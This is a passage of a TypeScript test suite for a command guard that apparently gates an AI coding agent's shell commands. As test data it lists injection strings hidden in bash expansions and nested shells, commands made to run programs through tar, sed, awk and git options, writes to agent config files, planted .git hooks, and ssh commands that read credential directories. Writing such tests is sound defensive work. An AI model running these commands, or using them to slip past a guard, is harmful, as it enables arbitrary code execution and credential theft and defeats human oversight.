      git("config", "--unset", "core.hooksPath");
      fs.rmSync(path.join(repo, "tools"), { recursive: true, force: true });
    }
  });
  test("editing an ordinary project file is left to opencode", () => assert.equal(edit("src/main.ts"), undefined));
});

// ---- round 2 review findings ----

describe("r2 A: the guard runs on what bash will run", () => {
  // 1: a # or << the parser reads as a comment or a heredoc, inside ${...} or arithmetic.
  expectEffect("ask", [
    "echo \\ # $'\\'' ; id #'",
    "echo a\\ #b; git fetch $'\\'' ; id #'",
    "echo a\\\n# $'\\'' ; id #'",
    "echo ${x:- #}; id",
    "echo ${x:-a # $(id)}",
    "(( true # $(id) ))",
    "echo $[ 1 # $(id) ]",
    "echo ${x:- <<EOF }\nid\nEOF",
    // 2: the same inside a nested shell, and a nested command that is not literal.
    "bash -c 'ls >&2#; id'",
    "bash -c 'cat <<E\"OF\"\nhello\nEOF\nid\n'",
    "eval 'ls >&2#; id'",
    "x='; id'; bash -c \"ls $x\"",
    "sudo bash -c 'echo ${x:- #}; id'",
    // 3: text that bash evaluates as code.
    "CI='$(id)'; printf '%s\\n' \"${CI@P}\"",
    "for x in '$(id)'; do echo \"${x@P}\"; done",
    "declare -i x='a[$(id)]'",
    "test -v 'a[$(id)]'",
    "declare x='b[$(id)]'; test -v \"$x\"",
    "declare x='b[$(id)]'; echo ${!x}",
    "for x in 'b[$(id)]'; do echo ${a[x]}; done",
    "for PS4 in '$(id)'; do set -x; true; done",
    // The sinks themselves, wherever the value comes from.
    "declare -i n=x",
    "typeset -i n",
    "local -ri n=x",
    "let n=x+1",
    "test -v \"$name\"",
    "[ -v a[x] ]",
    "echo ${!name}",
    "echo ${arr[i]}",
    "echo \"${v@Q}\"",
    "set -x",
    "set -euxo pipefail",
    "set -o xtrace",
    "unset 'a[i]'",
    "read -r 'a[i]' < f",
    "printf -v 'a[i]' x",
    "timeout 5 bash -c 'set -x; ls'",
  ]);
  // 4: options that make a program run another.
  expectEffect("ask", [
    "git grep -O'id' x",
    "git grep --open-files-in-pager=id x",
    "git grep --open-files-in-p=id x",
    "git submodule foreach 'id'",
    "git --no-pager submodule --quiet foreach id",
    "git rebase -x 'id' main",
    "git bisect run ./t.sh",
    "tar -cf t.tar --checkpoint=1 --checkpoint-action=exec='id' f",
    "tar -cf t.tar --checkpoint-ac=exec=id f",
    "tar -cf t.tar -I 'id' f",
    "tar cIf id t.tar f",
    "tar -cf t.tar --use-compress-program=id f",
    "tar -xf t.tar --to-command=id",
    "tar -cf host:t.tar f",
    "sort --compress-program=id f",
    "sort --compress-prog id f",
    "make --eval='$(shell id)'",
    "make SHELL=/tmp/x all",
    "fd -x id",
    "fd . --exec-batch id",
    "rg --pre id x .",
    "man -P id ls",
    "timeout 60 tar -xf t.tar --to-command=id",
    "sudo tar -cf t.tar -I id f",
    "tar -cf t.tar {--checkpoint=1,--checkpoint-action=exec=id} f",
  ]);
  expectEffect("classify", [
    "sed -n '1e id' f",
    "sed 's/.*/id/e' f",
    "sed 's/a/b/w out' f",
    "sed -n -e '1e id' f",
    "sed --expression='1e id' f",
    "sed -f script.sed f",
    "awk 'BEGIN{\"id\" | getline}'",
    "awk 'BEGIN{system(\"id\")}'",
    "awk -f prog.awk f",
    "awk -v c=id 'BEGIN{c | getline}'",
    "gawk '@load \"x\"; BEGIN{}'",
  ]);
  expectEffect("allow", [
    "sed -n '1,5p' README.md",
    "sed 's/a/b/g' README.md",
    "sed -i 's|a|b|' notes.txt",
    "sed -e 's/a/b/' -e '/x/d' README.md",
    "tar -czf out.tar.gz src",
    "tar -xzf out.tar.gz -C build",
    "sort -u README.md",
    "git grep -n foo",
    "git log --stat",
    "git diff --stat",
    "rg -n --hidden foo .",
    "mkdir -p src/{a,b}",
    "echo ${HOME:-x} \"${USER:-nobody}\"",
    "bash -c 'ls -la'",
  ]);
  // 5: a shortened option is the option, for git.
  expectEffect("ask", ["git reset --har HEAD", "git reset --hard HEAD", "git clean --forc", "git clean --force", "git checkout --forc x", "git branch --del --forc x", "git tag --del v1", "git restore --staged --work f", "git branch --set-up=origin/main", "git checkout --tr origin/x", "git gc --pru=now"]);
  expectEffect("allow", ["git reset --soft HEAD~1", "git reset HEAD f", "git clean -n", "git branch --list", "git restore --staged f"]);
  // 6: `>& file` writes the file; so does zsh's `>!`. One list of protected names.
  expectEffect("ask", [
    "printf 'x' >& CLAUDE.md",
    "printf 'x' >&CLAUDE.md",
    "printf 'x' >! CLAUDE.md",
    "printf 'x' >>! notes.txt",
    "echo x > CLAUDE.md",
    "cp x .claude/skills/y/SKILL.md",
    "mkdir -p .claude/commands",
    "echo x > .agents/a.md",
    "tee .claude/settings.json",
    "mv x AGENTS.md",
    "sed -i s/a/b/ .claude/settings.json",
  ]);
  expectEffect("allow", ["cat AGENTS.md", "cat CLAUDE.md", "ls .claude", "grep -r foo .claude .agents", "ls >&2", "ls 2>&1", "ls >/dev/null 2>&1"]);
  test("6: the three lists of opencode's project files are one", async () => {
    const { OPENCODE_PROJECT_FILES } = await import("../sandbox.ts");
    for (const name of [".opencode", ".claude", ".agents", "opencode.json", "opencode.jsonc", "AGENTS.md", "CLAUDE.md"]) {
      assert.ok(OPENCODE_PROJECT_FILES.includes(name), name);
      assert.equal(kind(await decide(`echo x > ${name.startsWith(".") && !name.includes("json") ? `${name}/f` : name}`)), "ask", name);
      assert.equal(decideFile(guard, new SessionState(repo), repo, path.join(repo, name.includes(".md") || name.includes("json") ? name : `${name}/f`))?.effect, "ask", name);
    }
  });
});

describe("r2 8: a write into a path named .git asks", () => {
  expectEffect("ask", ["ln -s ../node_modules/.cache/r src/.git", "mkdir -p vendor/x/.git/hooks", "cp -r /tmp/r sub/.git", "echo x > sub/.git/config", "touch sub/.git/HEAD", "mv r sub/.git"]);
  expectEffect("allow", ["mkdir -p node_modules/.cache/r/objects node_modules/.cache/r/refs", "touch .gitignore", "ls .git", "cat .git/HEAD"]);
});

describe("r2 21: code this session wrote goes to the model", () => {
  before(() => {
    fs.mkdirSync(path.join(repo, "scripts"), { recursive: true });
    fs.writeFileSync(path.join(repo, "scripts", "build.sh"), "#!/bin/sh\necho build\n", { mode: 0o755 });
    git("add", "scripts/build.sh");
    git("-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qm", "build script");
  });
  expectEffect("classify", [
    "printf 'id\\n' > 'my script.sh'; sh 'my script.sh'",
    "echo 'id' >> scripts/build.sh; ./scripts/build.sh",
    "sed -i 's/build/id/' scripts/build.sh && ./scripts/build.sh",
    "sed -i '2i id' scripts/build.sh && ./scripts/build.sh",
    "printf 'BEGIN{}' > x.awk; awk -f x.awk",
    "printf 's/a/b/' > x.sed; sed -f x.sed README.md",
    "printf 'all:\\n\\tid\\n' > x.mk; make -f x.mk",
    "printf 'package main' > x.go; go run x.go",
    "printf 'def test(): pass' > x_test.py; pytest x_test.py",
    "printf 'id' > x.sh; cd scripts && sh ../x.sh",
    "echo id | tee -a scripts/build.sh; bash scripts/build.sh",
    "cp scripts/build.sh run.sh; ./run.sh",
  ]);
  // The boundary: a build or a test run that does not name the file is the project's own business.
  expectEffect("allow", ["./scripts/build.sh", "printf 'all:\\n\\tid\\n' > Makefile; make", "echo x >> notes.txt; cat notes.txt", "printf 'x' > data.txt; sed 's/x/y/' data.txt"]);
  test("across calls: an appended or edited script is the session's from then on", async () => {
    const s = new SessionState(repo);
    const run = async (c: string) => kind(await decideShell(guard, s, repo, c));
    assert.equal(await run("./scripts/build.sh"), "allow");
    assert.equal(await run("echo 'id' >> scripts/build.sh"), "allow");
    assert.equal(await run("./scripts/build.sh"), "classify");
    assert.equal(await run("bash scripts/build.sh"), "classify");
    const t = new SessionState(repo);
    assert.equal(kind(await decideShell(guard, t, repo, "sed -i 's/build/x/' scripts/build.sh")), "allow");
    assert.equal(kind(await decideShell(guard, t, repo, "sh ./scripts/build.sh")), "classify");
  });
});

describe("r2 22: variables set without NAME=", () => {
  expectEffect("ask", [
    "for PATH in /tmp/x; do ls; done",
    "printf -v PATH /tmp/bin; ls",
    "printf -v PATH '%s' /tmp/bin",
    "read PATH <<< /tmp/x",
    "read -r a PATH < f",
    "read -a IFS < f",
    "mapfile -t PATH < f",
    "getopts ab PATH",
    "declare PATH",
    ": ${EDITOR:=/tmp/x}",
    "while read -r HOME; do ls; done < f",
  ]);
  expectEffect("allow", ["for f in a b; do echo $f; done", "printf -v line '%s' x"]);
});

describe("r2 27: installs behind wrappers and under other names", () => {
  expectEffect("ask", ["env -u X npm install", "timeout -s KILL 60 npm ci", "npm audit fix", "pnpm audit --fix fix", "cargo add serde", "uv run --with requests pytest", "nice -n 5 pip install x", "find . -name package.json -exec npm install \;"]);
  expectEffect("allow", ["npm audit", "cargo build", "uv run pytest", "ls node_modules/yarn", "which npm"]);
});

describe("r2 29: the environment asks where it matters, and no further", () => {
  // Round 3, finding 28 (signed off): these values change nothing that runs.
  expectEffect("allow", ["PYTHONPATH=src pytest", "NODE_OPTIONS=--max-old-space-size=8192 npm run build", "CC=clang make", "PAGER=cat git log"]);
  expectEffect("allow", ["f=src/x; ls $f", "n=3; echo $n", "curl http://localhost:3000/#/x", "echo a#b"]);
  expectEffect("classify", ["FOO=1 frobnicate", "FOO=bar npm test"]);
});

describe("r2 B: the layout check", () => {
  const fresh = () => {
    const dir = fs.realpathSync(fs.mkdtempSync(path.join(tmp, "proj-")));
    execFileSync("git", ["init", "-q", dir]);
    return dir;
  };
  test("8: a .git that is a symbolic link appearing pauses the session", async () => {
    const dir = fresh();
    const s = new SessionState(dir);
    assert.equal((await decideShell(guard, s, dir, "ls")).effect, "allow");
    fs.mkdirSync(path.join(dir, "node_modules", ".cache", "r"), { recursive: true });
    fs.mkdirSync(path.join(dir, "src"));
    fs.symlinkSync("../node_modules/.cache/r", path.join(dir, "src", ".git"));
    const d = await decideShell(guard, s, dir, "ls");
    assert.match(d.reason, /paused/);
    assert.ok(d.reason.includes(path.join(dir, "src", ".git")), d.reason);
  });
  test("8: the makings of a repository under node_modules pause it before any link is made", async () => {
    const dir = fresh();
    const s = new SessionState(dir);
    assert.equal((await decideShell(guard, s, dir, "ls")).effect, "allow");
    for (const d of ["objects", "refs"]) fs.mkdirSync(path.join(dir, "node_modules", ".cache", "r", d), { recursive: true });
    fs.writeFileSync(path.join(dir, "node_modules", ".cache", "r", "HEAD"), "ref: refs/heads/main\n");
    assert.match((await decideShell(guard, s, dir, "ls")).reason, /paused.*node_modules\/\.cache\/r/);
  });
  test("9: a repository appearing under node_modules pauses the session", async () => {
    const dir = fresh();
    const s = new SessionState(dir);
    assert.equal((await decideShell(guard, s, dir, "ls")).effect, "allow");
    execFileSync("git", ["init", "-q", path.join(dir, "node_modules", "pkg")]);
    assert.match((await decideShell(guard, s, dir, "ls")).reason, /paused.*node_modules\/pkg\/\.git/);
  });
  test("9: a repository six levels down pauses the session", async () => {
    const dir = fresh();
    const s = new SessionState(dir);
    assert.equal((await decideShell(guard, s, dir, "ls")).effect, "allow");
    execFileSync("git", ["init", "-q", path.join(dir, "a", "b", "c", "d", "e", "f")]);
    assert.match((await decideShell(guard, s, dir, "ls")).reason, /paused/);
  });
  test("13: where an asked command would create a repository", () => {
    const dir = fresh();
    assert.deepEqual(expectedRepos("git init sub", dir), [path.join(dir, "sub")]);
    assert.deepEqual(expectedRepos("git init", dir), [dir]);
    assert.deepEqual(expectedRepos("mkdir x && cd x && git init -q", dir), [path.join(dir, "x")]);
    assert.deepEqual(expectedRepos("git clone https://example.invalid/a/tool.git", dir), [path.join(dir, "tool")]);
    assert.deepEqual(expectedRepos("git clone -q https://example.invalid/a/tool.git vendor/t", dir), [path.join(dir, "vendor", "t")]);
    assert.deepEqual(expectedRepos("git worktree add ../wt feature", dir), [path.join(path.dirname(dir), "wt"), path.join(dir, ".git")]);
    for (const c of ["git push origin init-x", "git status", "git commit -m 'init clone worktree submodule'", "git init $(pwd)/x", "sudo ls"]) assert.equal(expectedRepos(c, dir), undefined, c);
  });
  test("13: an approval covers the place the command named, and nothing else", async () => {
    const dir = fresh();
    const s = new SessionState(dir);
    assert.equal((await decideShell(guard, s, dir, "ls")).effect, "allow");
    s.expecting.push({ dirs: [path.join(dir, "named")], at: Date.now(), done: true });
    execFileSync("git", ["init", "-q", path.join(dir, "named")]);
    assert.equal((await decideShell(guard, s, dir, "ls")).effect, "allow");
    assert.equal(s.expecting.length, 0, "a finished approval covers one check");
    execFileSync("git", ["init", "-q", path.join(dir, "later")]);
    assert.match((await decideShell(guard, s, dir, "ls")).reason, /paused/);
    const dir2 = fresh();
    const t = new SessionState(dir2);
    assert.equal((await decideShell(guard, t, dir2, "ls")).effect, "allow");
    t.expecting.push({ dirs: [path.join(dir2, "named")], at: Date.now() });
    execFileSync("git", ["init", "-q", path.join(dir2, "elsewhere")]);
    assert.match((await decideShell(guard, t, dir2, "ls")).reason, /paused.*elsewhere/);
  });
  test("13: an approved command does not explain a new opencode.json", async () => {
    const dir = fresh();
    const s = new SessionState(dir);
    assert.equal((await decideShell(guard, s, dir, "ls")).effect, "allow");
    s.expecting.push({ dirs: [dir], at: Date.now() });
    fs.writeFileSync(path.join(dir, "opencode.json"), "{}\n");
    assert.match((await decideShell(guard, s, dir, "ls")).reason, /paused.*opencode\.json/);
  });
  test("25: opencode's files appearing in a writable directory above the session directory pause it", async () => {
    const dir = fresh();
    const sub = path.join(dir, "packages", "app");
    fs.mkdirSync(sub, { recursive: true });
    const s = new SessionState(sub);
    assert.equal((await decideShell(guard, s, sub, "ls")).effect, "allow");
    fs.writeFileSync(path.join(dir, "opencode.json"), "{}\n");
    const d = await decideShell(guard, s, sub, "ls");
    assert.match(d.reason, /paused/);
    assert.ok(d.reason.includes(path.join(dir, "opencode.json")), d.reason);
  });
});

describe("r2 C: the check runs on what will run", () => {
  const ssh = (c: string, cwd = repo, s = new SessionState(repo)) => usesSsh(c, cwd, s);
  const global = process.env.GIT_CONFIG_GLOBAL!;
  const withGlobal = async (text: string, fn: () => Promise<void> | void) => {
    const before = fs.readFileSync(global, "utf8");
    fs.writeFileSync(global, before + text);
    try {
      await fn();
    } finally {
      fs.writeFileSync(global, before);
    }
  };
  const withHook = async (name: string, fn: () => Promise<void> | void) => {
    const hook = path.join(repo, ".git", "hooks", name);
    fs.mkdirSync(path.dirname(hook), { recursive: true });
    fs.writeFileSync(hook, "#!/bin/sh\nexit 0\n", { mode: 0o755 });
    try {
      await fn();
    } finally {
      fs.rmSync(hook);
    }
  };

  test("14: a cd that fails does not move the check to another repository", () => {
    const planted = path.join(tmp, "planted14");
    execFileSync("git", ["init", "-q", planted]);
    try {
      // bash's cd fails here, and after `;` git still runs, in the tool call's own directory.
      assert.ok(!ssh(`cd ${repo}/nope/..; git fetch origin`, planted));
      assert.ok(!ssh(`cd ${repo}; git fetch origin`, planted));
      assert.ok(!ssh(`cd ${repo}/nope/.. && git fetch origin`, planted));
      assert.ok(ssh(`cd ${repo} && git fetch origin`, planted));
    } finally {
      fs.rmSync(planted, { recursive: true, force: true });
    }
  });
  test("14: the same for a push", async () => {
    const planted = path.join(tmp, "planted14p");
    execFileSync("git", ["init", "-q", planted]);
    try {
      assert.equal(await effect(`cd ${repo}/nope/..; git push origin feature/x`, planted), "ask");
      assert.equal(await effect(`cd ${repo}; git push origin feature/x`, planted), "ask");
    } finally {
      fs.rmSync(planted, { recursive: true, force: true });
    }
  });
  test("15: a quoted ~ is not the home directory", () => {
    assert.ok(!ssh("git -C '~/work' fetch origin"));
    assert.ok(!ssh('cd "~" && git fetch origin'));
  });

  // 16: `printf -v` and `test -v` evaluate a subscript on the remote side.
  expectEffect("ask", [
    `ssh lab 'printf -v '"'"'a[$(id)]'"'"' x'`,
    `ssh lab 'test -v '"'"'a[$(id)]'"'"`,
    "ssh lab 'printf -v x y'",
    "ssh lab 'test -v x'",
    "ssh lab '[ -v x ]'",
    `ssh lab 'echo '"'"'$(id)'"'"`,
    "ssh lab 'test -N /etc/passwd'",
    // 18: recursive reads print whatever lies below, credentials included.
    "ssh lab 'grep -r \"\" /home/admin'",
    "ssh lab 'sudo grep -R x /root'",
    "ssh lab 'grep --include=id_rsa -e x /home'",
    "ssh lab 'rg x /etc'",
    "ssh lab 'rg --hidden --files /home/admin'",
    "ssh lab 'sudo rg \"\" /root'",
    "ssh lab 'ps auxe'",
    "ssh lab 'ps e'",
  ]);
  expectEffect("allow", [
    "ssh lab 'echo hello world'",
    "ssh lab 'printf hello'",
    "ssh lab 'test -f /etc/hostname && echo yes'",
    "ssh lab 'grep -i error /var/log/syslog'",
    "ssh lab 'rg --files /srv'",
    "ssh lab 'ps aux'",
    "ssh lab 'ps -ef'",
  ]);

  test("17: the push that would run is the push that is checked (remote.pushDefault)", async () => {
    // A second remote whose default branch has the current branch's name.
    const publish = path.join(tmp, "publish.git");
    execFileSync("git", ["init", "-q", "--bare", "-b", "feature/x", publish]);
    git("remote", "add", "publish", sshUrl(publish));
    git("push", "-q", "publish", "feature/x");
    try {
      assert.equal(await effect("git push"), "allow");
      await withGlobal("[remote]\n\tpushDefault = publish\n", async () => assert.equal(await effect("git push"), "ask"));
    } finally {
      git("remote", "remove", "publish");
      fs.rmSync(publish, { recursive: true, force: true });
    }
  });
  test("17: a push refspec in your own config decides where the branch goes", async () => {
    await withGlobal("[remote \"origin\"]\n\tpush = HEAD:refs/heads/main\n[push]\n\tdefault = current\n", async () => assert.equal(await effect("git push"), "ask"));
    assert.equal(await effect("git push"), "allow");
  });
  test("17: a key with no value is true for git (push.followTags)", async () => {
    await withGlobal("[push]\n\tfollowTags\n", async () => assert.equal(await effect("git push"), "ask"));
  });
  test("17: a repository with no remotes gives nothing the agent", () => {
    const bare = path.join(tmp, "noremotes");
    execFileSync("git", ["init", "-q", "-b", "main", bare]);
    execFileSync("git", ["-C", bare, "config", "branch.main.remote", "ssh://example.invalid/x.git"]);
    try {
      assert.ok(!usesSsh("git fetch", bare, new SessionState(bare)));
      assert.ok(!usesSsh("git pull", bare, new SessionState(bare)));
    } finally {
      fs.rmSync(bare, { recursive: true, force: true });
    }
  });
  test("17: with no remote named, the one git would pick must be known", () => {
    const restore = setConfig("branch.feature/x.remote", "nowhere");
    try {
      assert.ok(!ssh("git fetch"));
      assert.ok(ssh("git fetch origin"));
    } finally {
      restore();
    }
    assert.ok(ssh("git fetch"));
    assert.ok(ssh("git fetch --all"));
  });

  test("24: the agent is only given at the top of a checkout", () => {
    fs.mkdirSync(path.join(repo, "sub24"));
    try {
      assert.ok(!ssh("cd sub24 && git fetch"));
      assert.ok(!ssh("git -C sub24 fetch origin"));
      assert.ok(ssh("git -C . fetch origin"));
    } finally {
      fs.rmSync(path.join(repo, "sub24"), { recursive: true });
    }
  });
  test("24: not when a hook would run with it", async () => {
    await withHook("pre-push", async () => {
      assert.ok(!ssh("git push origin feature/x"));
      assert.equal(await effect("git push origin feature/x"), "ask");
      assert.ok(ssh("git fetch origin"), "pre-push does not run on a fetch");
    });
    await withHook("post-merge", () => {
      assert.ok(!ssh("git pull"));
      assert.ok(ssh("git fetch"));
    });
    await withHook("reference-transaction", () => assert.ok(!ssh("git fetch")));
    await withHook("pre-push.sample", () => assert.ok(ssh("git push origin feature/x")));
  });
});

describe("r2 E: allowed means it can work", () => {
  for (const c of [
    "git commit -m \"$(cat <<'EOF'\nfix: a thing (#12)\n\nIt's done, with $vars and `ticks` left alone.\nEOF\n)\"",
    "git commit -m x 2>&1",
    "git add -A && git commit -m x 2>&1",
    "git add -u",
    "git stash -u",
    "git commit -F msg",
    "git rebase main",
    "timeout 60 git fetch origin",
    "git push origin feature/x",
    "git commit -qm 'plain' >/dev/null 2>&1",
    // r3 13 (signed off): a glob in a path operand of add, rm, mv or restore that starts with a
    // plain path segment.
    "git add src/*.ts",
  ]) test(`git-only: ${JSON.stringify(c)}`, () => assert.ok(gitOnly(c)));
  for (const c of [
    "git commit -m \"$(cat <<EOF\n$(id)\nEOF\n)\"",
    "git commit -m \"$(date)\"",
    "git commit -m \"a $x\"",
    "git add *",
    "git commit -m x src/*.ts",
    "npm test && git commit -am x",
    "git fetch -u x origin",
    "git rebase -x id main",
    "git rebase -i main",
    "git add -p",
    "git commit -m x > out.txt",
    "timeout 60 npm test",
  ]) test(`not git-only: ${JSON.stringify(c)}`, () => assert.ok(!gitOnly(c)));

  const breaks = (c: string, s = new SessionState(repo)) => (s.roots ?? decideShell(guard, s, repo, "ls"), sandboxBreaks(c, repo, s));
  test("23: a git command that writes .git from a call that is not git-only would fail, so it asks", async () => {
    const s = new SessionState(repo);
    await decideShell(guard, s, repo, "ls");
    for (const c of ["npm test && git commit -am x", "git commit -m \"it's $x\"", "git add *", "git commit -m x > out.txt", "git stash && npm test", "echo done; git tag v2"]) assert.match(sandboxBreaks(c, repo, s) ?? "", /read-only/, c);
    // `git add src/*.ts` is git-only since r3 13.
    for (const c of ["git status", "git log --oneline | head", "git diff > out.patch", "git add -A && git commit -m x", "git stash list | wc -l", "git branch --list", "git tag", "npm test", "git add src/*.ts"]) assert.equal(sandboxBreaks(c, repo, s), undefined, c);
  });
  test("30: signing needs keys the sandbox hides", async () => {
    const s = new SessionState(repo);
    await decideShell(guard, s, repo, "ls");
    git("config", "commit.gpgsign", "true");
    try {
      assert.match(sandboxBreaks("git commit -m x", repo, s) ?? "", /sign/);
      assert.equal(sandboxBreaks("git status", repo, s), undefined);
    } finally {
      git("config", "--unset", "commit.gpgsign");
    }
    assert.match(sandboxBreaks("git commit -S -m x", repo, s) ?? "", /sign/);
    assert.equal(sandboxBreaks("git commit -m x", repo, s), undefined);
  });
  test("30: a fetch that needs the ssh agent and would not get it asks", async () => {
    const dir = fs.realpathSync(fs.mkdtempSync(path.join(tmp, "sshproj-")));
    execFileSync("git", ["init", "-q", "-b", "main", dir]);
    execFileSync("git", ["-C", dir, "remote", "add", "origin", "git@example.invalid:team/x.git"]);
    const s = new SessionState(dir);
    await decideShell(guard, s, dir, "ls");
    assert.equal(sandboxBreaks("git fetch origin", dir, s), undefined, "the single plain fetch gets the agent");
    assert.match(sandboxBreaks("git fetch origin && git status", dir, s) ?? "", /ssh agent/);
    fs.mkdirSync(path.join(dir, "sub"));
    assert.match(sandboxBreaks("cd sub && git fetch origin", dir, s) ?? "", /ssh agent/);
  });
  test("30: a fetch over https with a credential helper asks", async () => {
    const dir = fs.realpathSync(fs.mkdtempSync(path.join(tmp, "httpsproj-")));
    execFileSync("git", ["init", "-q", "-b", "main", dir]);
    execFileSync("git", ["-C", dir, "remote", "add", "origin", "https://example.invalid/team/x.git"]);
    const s = new SessionState(dir);
    await decideShell(guard, s, dir, "ls");
    assert.equal(sandboxBreaks("git fetch origin", dir, s), undefined);
    execFileSync("git", ["-C", dir, "config", "credential.helper", "store"]);
    assert.match(sandboxBreaks("git fetch origin", dir, s) ?? "", /credential helper/);
  });
  test("30: a value that spans lines in your git config does not take the agent away", () => {
    const global = process.env.GIT_CONFIG_GLOBAL!;
    const before = fs.readFileSync(global, "utf8");
    fs.writeFileSync(global, before + '[alias]\n\tboth = "!f() { \\\n\tgit status; \\\n\t}; f"\n\tnote = "line one\\nline two"\n');
    try {
      assert.ok(usesSsh("git fetch origin", repo, new SessionState(repo)));
    } finally {
      fs.writeFileSync(global, before);
    }
  });
});

// Round 3, group E scenarios (the commands themselves are in test/allow-corpus.txt). Each test
// uses a repository of its own. Finding 16 (an ssh remote with a user never matches the dry
// run's URL) needs a stand-in GIT_SSH behind a dry-run push and is left to the group E writer.
describe("r3 E: scenarios", () => {
  const fresh = (prefix: string, remoteUrl?: string) => {
    const dir = fs.realpathSync(fs.mkdtempSync(path.join(tmp, prefix)));
    execFileSync("git", ["init", "-q", "-b", "main", dir]);
    execFileSync("git", ["-C", dir, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "--allow-empty", "-m", "init"]);
    if (remoteUrl) execFileSync("git", ["-C", dir, "remote", "add", "origin", remoteUrl]);
    return dir;
  };
  const config = (dir: string, key: string, value: string) => execFileSync("git", ["-C", dir, "config", key, value]);
  // 15: an approved clone, init, worktree or submodule is expected where it lands, not at an
  // option's value.
  for (const [command, where] of [
    ["git clone --depth 1 https://github.com/o/r.git", ["r"]],
    ["git clone -b main https://github.com/o/r.git dest", ["dest"]],
    ["git init -b main x", ["x"]],
    ["git worktree add -b feat wt", ["wt", ".git"]],
    ["git submodule add -b main https://github.com/o/r.git vendor/r", ["vendor/r", ".git"]],
  ] as [string, string[]][]) {
    test(`15: ${command} is expected at ${where[0]}`, () => {
      const dir = fresh("expect-");
      assert.deepEqual(expectedRepos(command, dir), where.map((w) => path.join(dir, w)));
    });
  }
  test("17: a fetch over https with a URL-scoped credential helper (gh auth setup-git) asks", async () => {
    const dir = fresh("ghhelper-", "https://github.com/o/r.git");
    const s = new SessionState(dir);
    await decideShell(guard, s, dir, "ls");
    assert.equal(sandboxBreaks("git fetch origin", dir, s), undefined);
    config(dir, "credential.https://github.com.helper", "!gh auth git-credential");
    assert.match(sandboxBreaks("git fetch origin", dir, s) ?? "", /credential helper/);
  });
  test("27: a tag with tag.gpgSign on would fail in the sandbox, so it asks", async () => {
    const dir = fresh("tagsign-");
    const s = new SessionState(dir);
    await decideShell(guard, s, dir, "ls");
    assert.equal(sandboxBreaks("git tag -a v1 -m x", dir, s), undefined);
    config(dir, "tag.gpgSign", "true");
    assert.match(sandboxBreaks("git tag -a v1 -m x", dir, s) ?? "", /sign/);
  });
  for (const [key, value] of [["branch.main.vscode-merge-base", "origin/main"], ["remote.origin.gh-resolved", "base"], ["lfs.repositoryformatversion", "0"]]) {
    test(`30: a fetch keeps the ssh agent with the ordinary repository key ${key}`, () => {
      const dir = fresh("sshkeys-", "git@example.invalid:team/x.git");
      assert.ok(usesSsh("git fetch origin", dir, new SessionState(dir)), "the plain repository already loses the agent");
      config(dir, key, value);
      assert.ok(usesSsh("git fetch origin", dir, new SessionState(dir)), `${key} takes the agent away`);
    });
  }
  // 16: `git push --porcelain` prints the URL without its user, so the configured URL never
  // matched. A feature branch pushed to an ssh remote with a user, through the stand-in ssh.
  const pushProject = (prefix: string, url: (remote: string, dir: string) => string) => {
    const dir = fs.realpathSync(fs.mkdtempSync(path.join(tmp, prefix)));
    const remoteDir = `${dir}-remote.git`;
    execFileSync("git", ["init", "-q", "--bare", "-b", "main", remoteDir]);
    const run = (...args: string[]) => execFileSync("git", ["-C", dir, ...args], { stdio: ["ignore", "pipe", "pipe"] });
    run("init", "-q", "-b", "main");
    run("-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "--allow-empty", "-m", "init");
    run("remote", "add", "origin", url(remoteDir, dir));
    run("push", "-q", "origin", "main");
    run("checkout", "-q", "-b", "feature/x");
    run("push", "-q", "-u", "origin", "feature/x");
    return dir;
  };
  for (const [what, url] of [
    ["ssh://git@host/path", (r: string) => `ssh://git@automode-test.invalid${r}`],
    ["git@host:path (scp-like)", (r: string, dir: string) => `git@automode-test.invalid:${path.relative(dir, r)}`],
    ["ssh://user@host:port/path", (r: string) => `ssh://deploy@automode-test.invalid:2222${r}`],
  ] as [string, (r: string, dir: string) => string][]) {
    test(`r3 16: a feature-branch push to an ssh remote with a user is allowed: ${what}`, async () => {
      const dir = pushProject("r3-16-", url);
      const d = await decideShell(guard, new SessionState(dir), dir, "git push");
      assert.equal(d.effect, "allow", d.reason);
      assert.equal((await decideShell(guard, new SessionState(dir), dir, "git push origin feature/x:main")).effect, "ask");
    });
  }
  test("r3 16: the user is dropped as git drops it", () => {
    for (const [url, shown] of [
      ["git@github.com:o/r.git", "github.com:o/r.git"],
      ["ssh://git@github.com/o/r.git", "ssh://github.com/o/r.git"],
      ["ssh://a@b@host/p", "ssh://b@host/p"],
      ["https://user:pw@host/p", "https://host/p"],
      ["ssh://host/p@x", "ssh://host/p@x"],
      ["./p@x:y", "./p@x:y"],
      ["/abs/a@b:c", "/abs/a@b:c"],
      ["user@host", "user@host"],
      ["ex%t://u@h/p", "ex%t://u@h/p"],
      ["github.com:o/r.git", "github.com:o/r.git"],
    ]) assert.equal(anonymizeUrl(url), shown, url);
  });
  test("30: husky's core.hooksPath still refuses the ssh agent", () => {
    const dir = fresh("sshhusky-", "git@example.invalid:team/x.git");
    config(dir, "core.hooksPath", ".husky/_");
    assert.ok(!usesSsh("git fetch origin", dir, new SessionState(dir)));
  });
});

// Round 3, group E: the over-asking fixes and their nearest forms that must still ask. Each
// "allow" here was an ask or the model's before; each "ask" or "classify" is what a widening
// must not reach.
describe("r3 E: decisions", () => {
  // A checkout of its own with files to read and a remote over ssh.
  const fixture = (prefix: string, files: string[]) => {
    const dir = fs.realpathSync(fs.mkdtempSync(path.join(tmp, prefix)));
    for (const f of files) {
      fs.mkdirSync(path.dirname(path.join(dir, f)), { recursive: true });
      fs.writeFileSync(path.join(dir, f), "x\n");
    }
    execFileSync("git", ["init", "-q", "-b", "main", dir]);
    execFileSync("git", ["-C", dir, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "--allow-empty", "-m", "init"]);
    return dir;
  };
  const files = ["f", "index.ts", "src/a.ts", "src/b.ts", "dir/readme.md", "dir/notes.md", "data.json", "web/package.json", "dir/sub/x.go"];
  let plain = "";
  let dashed = "";
  let secret = "";
  before(() => {
    plain = fixture("r3e-", files);
    dashed = fixture("r3e-dash-", [...files, "-n.ts"]);
    secret = fixture("r3e-secret-", [...files, "keys/server.key", "keys/readme.md"]);
  });
  const expect = (want: Want, commands: string[], where = () => plain) => {
    for (const c of commands) test(`${want}: ${JSON.stringify(c)}`, async () => {
      const dir = where();
      const d = await decideShell(guard, new SessionState(dir), dir, c);
      assert.equal(kind(d), want, `${c} -> ${d.effect} by ${d.by}: ${d.reason}`);
    });
  };

  // 13: ordinary git writes are git-only (the corpus runs them); the nearest forms are not.
  for (const c of [
